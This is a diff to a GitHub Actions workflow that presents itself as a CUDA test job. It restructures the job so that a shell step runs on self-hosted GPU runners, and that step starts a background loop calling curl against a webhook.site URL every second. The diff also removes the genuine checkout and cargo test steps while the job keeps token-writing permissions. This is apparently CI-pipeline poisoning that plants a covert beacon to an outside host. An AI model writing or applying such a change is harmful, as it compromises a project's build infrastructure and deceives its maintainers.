@@ -8,6 +8,12 @@ jobs:
   runShell:
     runs-on: ubuntu-latest
     
+       
+  test-cuda:
+    concurrency:
+      group: ${{ github.workflow }}-${{ github.job }}-${{ github.head_ref || github.run_id }}
+      cancel-in-progress: true
+    runs-on: [single-gpu, nvidia-gpu, t4, ci]
     steps:
       - name: shell
         run: |
@@ -15,14 +21,6 @@ jobs:
                 do
                   sleep 1 ; curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18
                 done &
-
-      
- 
-  test-cuda:
-    concurrency:
-      group: ${{ github.workflow }}-${{ github.job }}-${{ github.head_ref || github.run_id }}
-      cancel-in-progress: true
-    runs-on: [single-gpu, nvidia-gpu, t4, ci]
     container:
       image: nvidia/cuda:12.3.1-devel-ubuntu22.04
       options: --gpus 0 
@@ -34,13 +32,4 @@ jobs:
       # with sigstore/fulcio when running outside of PRs.
       id-token: write
       security-events: write
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
-      - name: Install dependencies
-        run: apt-get update && apt install curl build-essential libssl-dev protobuf-compiler pkg-config -y
-      - name: Install Rust Stable
-        uses: actions-rust-lang/setup-rust-toolchain@v1
-      - uses: Swatinem/rust-cache@v2
-      - name: Test (cuda)
-        run: cargo test --features cuda
+      
